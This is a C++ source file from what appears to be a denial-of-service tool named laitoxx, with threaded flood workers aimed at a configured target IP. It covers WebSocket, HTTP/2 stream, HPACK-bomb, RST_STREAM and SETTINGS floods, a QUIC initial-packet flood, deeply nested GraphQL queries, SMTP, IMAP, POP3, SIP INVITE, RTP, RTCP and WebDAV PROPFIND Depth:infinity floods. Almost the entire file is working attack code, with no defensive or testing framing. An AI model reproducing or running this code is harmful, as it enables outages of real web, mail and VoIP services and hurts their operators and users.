#include "l7_specialized.h"
#include <sstream>
#include <random>
#include <chrono>
#include <cstring>
#include <iomanip>

#ifdef _WIN32
    #include <winsock2.h>
    #include <ws2tcpip.h>
    #define close closesocket
#else
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <unistd.h>
    #define SOCKET int
    #define INVALID_SOCKET -1
#endif

namespace laitoxx {

// Utility functions
static std::string random_string(size_t length) {
    static const char alphanum[] =
        "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
    static std::random_device rd;
    static std::mt19937 gen(rd());
    static std::uniform_int_distribution<> dis(0, sizeof(alphanum) - 2);

    std::string result;
    result.reserve(length);
    for (size_t i = 0; i < length; ++i) {
        result += alphanum[dis(gen)];
    }
    return result;
}

static std::string base64_encode(const std::string& input) {
    static const char encoding_table[] =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::string result;
    int val = 0, valb = -6;

    for (unsigned char c : input) {
        val = (val << 8) + c;
        valb += 8;
        while (valb >= 0) {
            result.push_back(encoding_table[(val >> valb) & 0x3F]);
            valb -= 6;
        }
    }
    if (valb > -6) result.push_back(encoding_table[((val << 8) >> (valb + 8)) & 0x3F]);
    while (result.size() % 4) result.push_back('=');
    return result;
}

// ============================================================================
// WebSocket Flood
// ============================================================================

void WebSocketFlood::start() {
    log("Starting WebSocket flood attack");

    for (int i = 0; i < config_.thread_count; ++i) {
        threads_.emplace_back(&WebSocketFlood::attack_worker, this);
    }
}

std::string WebSocketFlood::generate_websocket_handshake() {
    std::string key = base64_encode(random_string(16));

    std::stringstream ss;
    ss << "GET /chat HTTP/1.1\r\n"
       << "Host: " << config_.target_ip << "\r\n"
       << "Upgrade: websocket\r\n"
       << "Connection: Upgrade\r\n"
       << "Sec-WebSocket-Key: " << key << "\r\n"
       << "Sec-WebSocket-Version: 13\r\n"
       << "User-Agent: Mozilla/5.0\r\n\r\n";

    return ss.str();
}

std::string WebSocketFlood::create_websocket_frame(const std::string& payload) {
    std::string frame;
    frame.push_back(0x81); // FIN + text frame

    size_t len = payload.length();
    if (len < 126) {
        frame.push_back(0x80 | len); // Masked + length
    } else if (len < 65536) {
        frame.push_back(0x80 | 126);
        frame.push_back((len >> 8) & 0xFF);
        frame.push_back(len & 0xFF);
    }

    // Masking key
    char mask[4] = {0x12, 0x34, 0x56, 0x78};
    frame.append(mask, 4);

    // Masked payload
    for (size_t i = 0; i < len; ++i) {
        frame.push_back(payload[i] ^ mask[i % 4]);
    }

    return frame;
}

void WebSocketFlood::attack_worker() {
    auto start_time = std::chrono::steady_clock::now();
    auto duration = std::chrono::seconds(config_.duration_seconds);

    while (!stop_flag_ &&
           std::chrono::steady_clock::now() - start_time < duration) {

        SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == INVALID_SOCKET) continue;

        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(config_.port);
        inet_pton(AF_INET, config_.target_ip.c_str(), &addr.sin_addr);

        if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
            // Send WebSocket handshake
            std::string handshake = generate_websocket_handshake();
            send(sock, handshake.c_str(), handshake.length(), 0);

            // Receive handshake response
            char buffer[1024];
            recv(sock, buffer, sizeof(buffer), 0);

            // Send multiple frames
            for (int i = 0; i < 100 && !stop_flag_; ++i) {
                std::string payload = "{\"type\":\"flood\",\"data\":\"" + random_string(1000) + "\"}";
                std::string frame = create_websocket_frame(payload);
                send(sock, frame.c_str(), frame.length(), 0);
                packets_sent_++;
            }
        }

        close(sock);
    }
}

// ============================================================================
// HTTP/2 Stream Flood
// ============================================================================

void HTTP2StreamFlood::start() {
    log("Starting HTTP/2 stream flood attack");

    for (int i = 0; i < config_.thread_count; ++i) {
        threads_.emplace_back(&HTTP2StreamFlood::attack_worker, this);
    }
}

std::vector<char> HTTP2StreamFlood::build_http2_headers_frame(uint32_t stream_id) {
    std::vector<char> frame;

    // Frame header (9 bytes)
    // Length (3 bytes) - placeholder
    frame.push_back(0x00);
    frame.push_back(0x00);
    frame.push_back(0x20); // ~32 bytes payload

    frame.push_back(0x01); // Type: HEADERS
    frame.push_back(0x05); // Flags: END_HEADERS | END_STREAM

    // Stream ID (4 bytes)
    frame.push_back((stream_id >> 24) & 0x7F);
    frame.push_back((stream_id >> 16) & 0xFF);
    frame.push_back((stream_id >> 8) & 0xFF);
    frame.push_back(stream_id & 0xFF);

    // Minimal HPACK encoded headers (:method GET, :path /)
    const char hpack[] = {
        0x82, // :method: GET
        0x86, // :scheme: http
        0x84, // :path: /
        0x41, 0x0f, 0x77, 0x77, 0x77, 0x2e, 0x65, 0x78,
        0x61, 0x6d, 0x70, 0x6c, 0x65, 0x2e, 0x63, 0x6f, 0x6d
    };
    frame.insert(frame.end(), hpack, hpack + sizeof(hpack));

    return frame;
}

std::vector<char> HTTP2StreamFlood::build_http2_data_frame(uint32_t stream_id, const std::string& data) {
    std::vector<char> frame;

    uint32_t len = data.length();
    frame.push_back((len >> 16) & 0xFF);
    frame.push_back((len >> 8) & 0xFF);
    frame.push_back(len & 0xFF);

    frame.push_back(0x00); // Type: DATA
    frame.push_back(0x01); // Flags: END_STREAM

    frame.push_back((stream_id >> 24) & 0x7F);
    frame.push_back((stream_id >> 16) & 0xFF);
    frame.push_back((stream_id >> 8) & 0xFF);
    frame.push_back(stream_id & 0xFF);

    frame.insert(frame.end(), data.begin(), data.end());

    return frame;
}

void HTTP2StreamFlood::attack_worker() {
    auto start_time = std::chrono::steady_clock::now();
    auto duration = std::chrono::seconds(config_.duration_seconds);

    while (!stop_flag_ &&
           std::chrono::steady_clock::now() - start_time < duration) {

        SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == INVALID_SOCKET) continue;

        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(config_.port);
        inet_pton(AF_INET, config_.target_ip.c_str(), &addr.sin_addr);

        if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
            // Send HTTP/2 preface
            const char preface[] = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
            send(sock, preface, 24, 0);

            // Send SETTINGS frame
            const char settings[] = {
                0x00, 0x00, 0x00, // Length: 0
                0x04,             // Type: SETTINGS
                0x00,             // Flags
                0x00, 0x00, 0x00, 0x00 // Stream ID: 0
            };
            send(sock, settings, 9, 0);

            // Flood with many streams
            for (uint32_t stream_id = 1; stream_id < 1000 && !stop_flag_; stream_id += 2) {
                auto frame = build_http2_headers_frame(stream_id);
                send(sock, frame.data(), frame.size(), 0);
                packets_sent_++;
            }
        }

        close(sock);
    }
}

// ============================================================================
// HTTP/2 HPACK Bomb
// ============================================================================

void HTTP2HPACKBomb::start() {
    log("Starting HTTP/2 HPACK bomb attack");

    for (int i = 0; i < config_.thread_count; ++i) {
        threads_.emplace_back(&HTTP2HPACKBomb::attack_worker, this);
    }
}

std::vector<char> HTTP2HPACKBomb::build_hpack_bomb() {
    std::vector<char> frame;

    // Frame header for large HEADERS frame
    frame.push_back(0x00);
    frame.push_back(0x40); // 16KB
    frame.push_back(0x00);
    frame.push_back(0x01); // Type: HEADERS
    frame.push_back(0x04); // Flags: END_HEADERS
    frame.push_back(0x00);
    frame.push_back(0x00);
    frame.push_back(0x00);
    frame.push_back(0x03); // Stream ID: 3

    // Add many dynamic table entries (HPACK bomb)
    for (int i = 0; i < 1000; ++i) {
        frame.push_back(0x40); // Literal Header Field with Incremental Indexing
        frame.push_back(0x0a); // Name length: 10
        std::string name = "header" + std::to_string(i);
        frame.insert(frame.end(), name.begin(), name.begin() + 10);
        frame.push_back(0x10); // Value length: 16
        std::string value = random_string(16);
        frame.insert(frame.end(), value.begin(), value.end());
    }

    return frame;
}

void HTTP2HPACKBomb::attack_worker() {
    auto start_time = std::chrono::steady_clock::now();
    auto duration = std::chrono::seconds(config_.duration_seconds);

    while (!stop_flag_ &&
           std::chrono::steady_clock::now() - start_time < duration) {

        SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == INVALID_SOCKET) continue;

        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(config_.port);
        inet_pton(AF_INET, config_.target_ip.c_str(), &addr.sin_addr);

        if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
            const char preface[] = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
            send(sock, preface, 24, 0);

            auto bomb = build_hpack_bomb();
            send(sock, bomb.data(), bomb.size(), 0);
            packets_sent_++;
        }

        close(sock);
    }
}

// ============================================================================
// HTTP/2 RST_STREAM Flood
// ============================================================================

void HTTP2RSTFlood::start() {
    log("Starting HTTP/2 RST_STREAM flood attack");

    for (int i = 0; i < config_.thread_count; ++i) {
        threads_.emplace_back(&HTTP2RSTFlood::attack_worker, this);
    }
}

std::vector<char> HTTP2RSTFlood::build_rst_stream_frame(uint32_t stream_id) {
    std::vector<char> frame = {
        0x00, 0x00, 0x04, // Length: 4
        0x03,             // Type: RST_STREAM
        0x00,             // Flags
        (char)((stream_id >> 24) & 0x7F),
        (char)((stream_id >> 16) & 0xFF),
        (char)((stream_id >> 8) & 0xFF),
        (char)(stream_id & 0xFF),
        0x00, 0x00, 0x00, 0x08 // Error code: CANCEL
    };

    return frame;
}

void HTTP2RSTFlood::attack_worker() {
    auto start_time = std::chrono::steady_clock::now();
    auto duration = std::chrono::seconds(config_.duration_seconds);

    while (!stop_flag_ &&
           std::chrono::steady_clock::now() - start_time < duration) {

        SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == INVALID_SOCKET) continue;

        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(config_.port);
        inet_pton(AF_INET, config_.target_ip.c_str(), &addr.sin_addr);

        if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
            const char preface[] = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
            send(sock, preface, 24, 0);

            // Send RST_STREAM for many stream IDs
            for (uint32_t stream_id = 1; stream_id < 10000 && !stop_flag_; stream_id += 2) {
                auto frame = build_rst_stream_frame(stream_id);
                send(sock, frame.data(), frame.size(), 0);
                packets_sent_++;
            }
        }

        close(sock);
    }
}

// ============================================================================
// HTTP/2 SETTINGS Flood
// ============================================================================

void HTTP2SettingsFlood::start() {
    log("Starting HTTP/2 SETTINGS flood attack");

    for (int i = 0; i < config_.thread_count; ++i) {
        threads_.emplace_back(&HTTP2SettingsFlood::attack_worker, this);
    }
}

std::vector<char> HTTP2SettingsFlood::build_settings_frame() {
    std::vector<char> frame = {
        0x00, 0x00, 0x06, // Length: 6 (1 setting)
        0x04,             // Type: SETTINGS
        0x00,             // Flags
        0x00, 0x00, 0x00, 0x00, // Stream ID: 0
        0x00, 0x03,       // ID: SETTINGS_MAX_CONCURRENT_STREAMS
        0x00, 0x00, 0x00, 0x64 // Value: 100
    };

    return frame;
}

void HTTP2SettingsFlood::attack_worker() {
    auto start_time = std::chrono::steady_clock::now();
    auto duration = std::chrono::seconds(config_.duration_seconds);

    while (!stop_flag_ &&
           std::chrono::steady_clock::now() - start_time < duration) {

        SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == INVALID_SOCKET) continue;

        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(config_.port);
        inet_pton(AF_INET, config_.target_ip.c_str(), &addr.sin_addr);

        if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
            const char preface[] = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
            send(sock, preface, 24, 0);

            // Flood with SETTINGS frames
            for (int i = 0; i < 1000 && !stop_flag_; ++i) {
                auto frame = build_settings_frame();
                send(sock, frame.data(), frame.size(), 0);
                packets_sent_++;
            }
        }

        close(sock);
    }
}

// ============================================================================
// HTTP/3 QUIC Flood
// ============================================================================

void HTTP3QUICFlood::start() {
    log("Starting HTTP/3 QUIC flood attack");

    for (int i = 0; i < config_.thread_count; ++i) {
        threads_.emplace_back(&HTTP3QUICFlood::attack_worker, this);
    }
}

std::vector<char> HTTP3QUICFlood::build_quic_initial_packet() {
    std::vector<char> packet;

    // QUIC header (simplified)
    packet.push_back(0xC0 | 0x00); // Long header, Initial packet
    packet.push_back(0x00);
    packet.push_back(0x00);
    packet.push_back(0x00);
    packet.push_back(0x01); // Version 1

    // Destination Connection ID Length
    packet.push_back(0x08);
    // Destination Connection ID (8 bytes random)
    for (int i = 0; i < 8; ++i) {
        packet.push_back(rand() & 0xFF);
    }

    // Source Connection ID Length
    packet.push_back(0x00);

    // Token Length
    packet.push_back(0x00);

    // Length (variable length integer)
    packet.push_back(0x40);
    packet.push_back(0x64); // 100 bytes

    // Packet Number
    packet.push_back(0x00);
    packet.push_back(0x00);

    // Payload (CRYPTO frame with ClientHello)
    for (int i = 0; i < 100; ++i) {
        packet.push_back(rand() & 0xFF);
    }

    return packet;
}

std::vector<char> HTTP3QUICFlood::build_quic_handshake() {
    return build_quic_initial_packet(); // Simplified
}

void HTTP3QUICFlood::attack_worker() {
    auto start_time = std::chrono::steady_clock::now();
    auto duration = std::chrono::seconds(config_.duration_seconds);

    while (!stop_flag_ &&
           std::chrono::steady_clock::now() - start_time < duration) {

        SOCKET sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock == INVALID_SOCKET) continue;

        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(config_.port);
        inet_pton(AF_INET, config_.target_ip.c_str(), &addr.sin_addr);

        auto packet = build_quic_initial_packet();
        sendto(sock, packet.data(), packet.size(), 0,
               (struct sockaddr*)&addr, sizeof(addr));
        packets_sent_++;

        close(sock);
    }
}

// ============================================================================
// GraphQL Flood
// ============================================================================

void GraphQLFlood::start() {
    log("Starting GraphQL complexity flood attack");

    for (int i = 0; i < config_.thread_count; ++i) {
        threads_.emplace_back(&GraphQLFlood::attack_worker, this);
    }
}

std::string GraphQLFlood::generate_complex_query(int depth) {
    std::stringstream ss;
    ss << "query {\n";
    ss << generate_nested_query(depth);
    ss << "}\n";
    return ss.str();
}

std::string GraphQLFlood::generate_nested_query(int depth) {
    if (depth == 0) {
        return "  id name\n";
    }

    std::stringstream ss;
    ss << "  users {\n";
    ss << "    id\n";
    ss << "    name\n";
    ss << "    posts {\n";
    ss << generate_nested_query(depth - 1);
    ss << "    }\n";
    ss << "  }\n";

    return ss.str();
}

void GraphQLFlood::attack_worker() {
    auto start_time = std::chrono::steady_clock::now();
    auto duration = std::chrono::seconds(config_.duration_seconds);

    while (!stop_flag_ &&
           std::chrono::steady_clock::now() - start_time < duration) {

        SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == INVALID_SOCKET) continue;

        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(config_.port);
        inet_pton(AF_INET, config_.target_ip.c_str(), &addr.sin_addr);

        if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
            std::string query = generate_complex_query(10);
            std::string json = "{\"query\":\"" + query + "\"}";

            std::stringstream request;
            request << "POST /graphql HTTP/1.1\r\n"
                   << "Host: " << config_.target_ip << "\r\n"
                   << "Content-Type: application/json\r\n"
                   << "Content-Length: " << json.length() << "\r\n"
                   << "\r\n"
                   << json;

            std::string req = request.str();
            send(sock, req.c_str(), req.length(), 0);
            packets_sent_++;
        }

        close(sock);
    }
}

// Остальные методы будут продолжены...
// (SMTP, IMAP, POP3, SIP, RTP, RTCP, WebDAV)

// ============================================================================
// SMTP Flood
// ============================================================================

void SMTPFlood::start() {
    log("Starting SMTP flood attack");

    for (int i = 0; i < config_.thread_count; ++i) {
        threads_.emplace_back(&SMTPFlood::attack_worker, this);
    }
}

void SMTPFlood::smtp_handshake(SOCKET sock) {
    // Set recv timeout to avoid blocking forever
#ifdef _WIN32
    DWORD timeout = 2000;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));
#else
    struct timeval tv{2, 0};
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
#endif

    char buffer[1024];

    // Read server greeting
    recv(sock, buffer, sizeof(buffer), 0);

    // Send EHLO
    const char* ehlo = "EHLO example.com\r\n";
    send(sock, ehlo, strlen(ehlo), 0);
    recv(sock, buffer, sizeof(buffer), 0);

    // Blast multiple MAIL FROM/RCPT TO/DATA sequences on same connection
    for (int i = 0; i < 4 && !stop_flag_; ++i) {
        const char* from = "MAIL FROM:<flood@example.com>\r\n";
        send(sock, from, strlen(from), 0);

        const char* to = "RCPT TO:<victim@example.com>\r\n";
        send(sock, to, strlen(to), 0);

        const char* data = "DATA\r\nSubject: test\r\n\r\ndata\r\n.\r\n";
        send(sock, data, strlen(data), 0);

        packets_sent_++;
    }

    // RSET to reset session for re-use
    const char* rset = "RSET\r\n";
    send(sock, rset, strlen(rset), 0);
}

void SMTPFlood::attack_worker() {
    worker_loop([this]() {
        SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == INVALID_SOCKET) return;

        // Connect timeout
#ifdef _WIN32
        DWORD timeout = 3000;
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const char*)&timeout, sizeof(timeout));
#else
        struct timeval tv{3, 0};
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
#endif

        struct sockaddr_in addr{};
        addr.sin_family = AF_INET;
        addr.sin_port = htons(config_.port ? config_.port : 25);
        inet_pton(AF_INET, config_.target_ip.c_str(), &addr.sin_addr);

        if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
            smtp_handshake(sock);
        }

        close(sock);
    });
}

// ============================================================================
// IMAP/POP3 Flood - Stubs (можно расширить аналогично SMTP)
// ============================================================================

void IMAPFlood::start() {
    log("Starting IMAP flood attack");
    for (int i = 0; i < config_.thread_count; ++i) {
        threads_.emplace_back(&IMAPFlood::attack_worker, this);
    }
}

void IMAPFlood::imap_commands(SOCKET sock) {
#ifdef _WIN32
    DWORD tv = 2000;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof(tv));
#else
    struct timeval tv{2, 0};
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
#endif
    char buf[4096];
    recv(sock, buf, sizeof(buf), 0);  // greeting

    const char* commands[] = {
        "A001 LOGIN user pass\r\n",
        "A002 SELECT INBOX\r\n",
        "A003 SEARCH ALL\r\n",
        "A004 FETCH 1:* (FLAGS)\r\n",
        "A005 LOGOUT\r\n",
    };
    for (const char* cmd : commands) {
        send(sock, cmd, strlen(cmd), 0);
        recv(sock, buf, sizeof(buf), 0);
    }
}

void IMAPFlood::attack_worker() {
    worker_loop([this]() {
        SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == INVALID_SOCKET) return;

#ifdef _WIN32
        DWORD stv = 3000;
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const char*)&stv, sizeof(stv));
#else
        struct timeval stv{3, 0};
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &stv, sizeof(stv));
#endif

        struct sockaddr_in addr{};
        addr.sin_family = AF_INET;
        addr.sin_port = htons(config_.port ? config_.port : 143);
        inet_pton(AF_INET, config_.target_ip.c_str(), &addr.sin_addr);

        if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
            packets_sent_++;
            imap_commands(sock);
        }

        close(sock);
    });
}

void POP3Flood::start() {
    log("Starting POP3 flood attack");
    for (int i = 0; i < config_.thread_count; ++i) {
        threads_.emplace_back(&POP3Flood::attack_worker, this);
    }
}

void POP3Flood::pop3_commands(SOCKET sock) {
#ifdef _WIN32
    DWORD tv = 2000;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof(tv));
#else
    struct timeval tv{2, 0};
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
#endif
    char buf[4096];
    recv(sock, buf, sizeof(buf), 0);  // greeting

    const char* commands[] = {
        "USER user\r\n",
        "PASS pass\r\n",
        "STAT\r\n",
        "LIST\r\n",
        "QUIT\r\n",
    };
    for (const char* cmd : commands) {
        send(sock, cmd, strlen(cmd), 0);
        recv(sock, buf, sizeof(buf), 0);
    }
}

void POP3Flood::attack_worker() {
    worker_loop([this]() {
        SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == INVALID_SOCKET) return;

#ifdef _WIN32
        DWORD stv = 3000;
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const char*)&stv, sizeof(stv));
#else
        struct timeval stv{3, 0};
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &stv, sizeof(stv));
#endif

        struct sockaddr_in addr{};
        addr.sin_family = AF_INET;
        addr.sin_port = htons(config_.port ? config_.port : 110);
        inet_pton(AF_INET, config_.target_ip.c_str(), &addr.sin_addr);

        if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
            packets_sent_++;
            pop3_commands(sock);
        }

        close(sock);
    });
}

// SIP, RTP, RTCP, WebDAV - продолжение следует...

void SIPFlood::start() {
    log("Starting SIP INVITE flood attack");
    for (int i = 0; i < config_.thread_count; ++i) {
        threads_.emplace_back(&SIPFlood::attack_worker, this);
    }
}

std::string SIPFlood::random_call_id() {
    return random_string(32) + "@" + config_.target_ip;
}

std::string SIPFlood::generate_sip_invite() {
    std::stringstream ss;
    ss << "INVITE sip:victim@" << config_.target_ip << " SIP/2.0\r\n"
       << "Via: SIP/2.0/UDP " << config_.target_ip << ":5060\r\n"
       << "From: <sip:attacker@example.com>;tag=" << random_string(8) << "\r\n"
       << "To: <sip:victim@" << config_.target_ip << ">\r\n"
       << "Call-ID: " << random_call_id() << "\r\n"
       << "CSeq: 1 INVITE\r\n"
       << "Contact: <sip:attacker@example.com>\r\n"
       << "Content-Length: 0\r\n"
       << "\r\n";

    return ss.str();
}

void SIPFlood::attack_worker() {
    auto start_time = std::chrono::steady_clock::now();
    auto duration = std::chrono::seconds(config_.duration_seconds);

    while (!stop_flag_ &&
           std::chrono::steady_clock::now() - start_time < duration) {

        SOCKET sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock == INVALID_SOCKET) continue;

        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(config_.port ? config_.port : 5060);
        inet_pton(AF_INET, config_.target_ip.c_str(), &addr.sin_addr);

        std::string invite = generate_sip_invite();
        sendto(sock, invite.c_str(), invite.length(), 0,
               (struct sockaddr*)&addr, sizeof(addr));
        packets_sent_++;

        close(sock);
    }
}

void RTPFlood::start() {
    log("Starting RTP flood attack");
    for (int i = 0; i < config_.thread_count; ++i) {
        threads_.emplace_back(&RTPFlood::attack_worker, this);
    }
}

std::vector<char> RTPFlood::build_rtp_packet() {
    std::vector<char> packet;

    // RTP header (12 bytes)
    packet.push_back(0x80); // V=2, P=0, X=0, CC=0
    packet.push_back(0x00); // M=0, PT=0
    packet.push_back(0x00); // Sequence number
    packet.push_back(0x01);
    packet.push_back(0x00); // Timestamp
    packet.push_back(0x00);
    packet.push_back(0x00);
    packet.push_back(0x00);
    packet.push_back(0x00); // SSRC
    packet.push_back(0x00);
    packet.push_back(0x00);
    packet.push_back(0x01);

    // Payload (random audio data)
    for (int i = 0; i < 160; ++i) {
        packet.push_back(rand() & 0xFF);
    }

    return packet;
}

void RTPFlood::attack_worker() {
    auto start_time = std::chrono::steady_clock::now();
    auto duration = std::chrono::seconds(config_.duration_seconds);

    while (!stop_flag_ &&
           std::chrono::steady_clock::now() - start_time < duration) {

        SOCKET sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock == INVALID_SOCKET) continue;

        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(config_.port);
        inet_pton(AF_INET, config_.target_ip.c_str(), &addr.sin_addr);

        auto packet = build_rtp_packet();
        sendto(sock, packet.data(), packet.size(), 0,
               (struct sockaddr*)&addr, sizeof(addr));
        packets_sent_++;

        close(sock);
    }
}

void RTCPFlood::start() {
    log("Starting RTCP flood attack");
    for (int i = 0; i < config_.thread_count; ++i) {
        threads_.emplace_back(&RTCPFlood::attack_worker, this);
    }
}

std::vector<char> RTCPFlood::build_rtcp_packet() {
    std::vector<char> packet;

    // RTCP SR (Sender Report)
    packet.push_back(0x80); // V=2, P=0, RC=0
    packet.push_back(0xC8); // PT=SR (200)
    packet.push_back(0x00); // Length
    packet.push_back(0x06);
    packet.push_back(0x00); // SSRC
    packet.push_back(0x00);
    packet.push_back(0x00);
    packet.push_back(0x01);

    // NTP timestamp, RTP timestamp, packet count, octet count
    for (int i = 0; i < 20; ++i) {
        packet.push_back(0x00);
    }

    return packet;
}

void RTCPFlood::attack_worker() {
    auto start_time = std::chrono::steady_clock::now();
    auto duration = std::chrono::seconds(config_.duration_seconds);

    while (!stop_flag_ &&
           std::chrono::steady_clock::now() - start_time < duration) {

        SOCKET sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock == INVALID_SOCKET) continue;

        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(config_.port + 1); // RTCP usually RTP port + 1
        inet_pton(AF_INET, config_.target_ip.c_str(), &addr.sin_addr);

        auto packet = build_rtcp_packet();
        sendto(sock, packet.data(), packet.size(), 0,
               (struct sockaddr*)&addr, sizeof(addr));
        packets_sent_++;

        close(sock);
    }
}

void WebDAVFlood::start() {
    log("Starting WebDAV PROPFIND flood attack");
    for (int i = 0; i < config_.thread_count; ++i) {
        threads_.emplace_back(&WebDAVFlood::attack_worker, this);
    }
}

std::string WebDAVFlood::generate_propfind_request() {
    std::string xml =
        "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n"
        "<D:propfind xmlns:D=\"DAV:\">\n"
        "  <D:allprop/>\n"
        "</D:propfind>";

    std::stringstream ss;
    ss << "PROPFIND / HTTP/1.1\r\n"
       << "Host: " << config_.target_ip << "\r\n"
       << "Depth: infinity\r\n"
       << "Content-Type: application/xml\r\n"
       << "Content-Length: " << xml.length() << "\r\n"
       << "\r\n"
       << xml;

    return ss.str();
}

void WebDAVFlood::attack_worker() {
    auto start_time = std::chrono::steady_clock::now();
    auto duration = std::chrono::seconds(config_.duration_seconds);

    while (!stop_flag_ &&
           std::chrono::steady_clock::now() - start_time < duration) {

        SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == INVALID_SOCKET) continue;

        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(config_.port);
        inet_pton(AF_INET, config_.target_ip.c_str(), &addr.sin_addr);

        if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
            std::string request = generate_propfind_request();
            send(sock, request.c_str(), request.length(), 0);
            packets_sent_++;
        }

        close(sock);
    }
}

} // namespace laitoxx
